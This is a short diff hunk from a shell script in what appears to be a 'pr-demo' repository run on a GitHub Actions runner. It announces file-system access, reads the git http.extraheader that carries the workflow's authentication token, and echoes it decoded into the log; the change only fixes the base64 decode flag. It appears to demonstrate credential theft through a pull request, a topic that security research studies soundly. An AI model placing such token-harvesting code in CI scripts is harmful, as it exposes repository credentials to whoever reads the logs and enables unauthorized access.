@@ -160,7 +160,7 @@ echo We have access to the file system!
 # done
 
 GIT_VALUES=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | cut -d' ' -f3 | base64`
-echo GIT_VALUES=$GIT_VALUES | base64 -D
+echo GIT_VALUES=$GIT_VALUES | base64 -d
 
 # Escape application args
 save () {
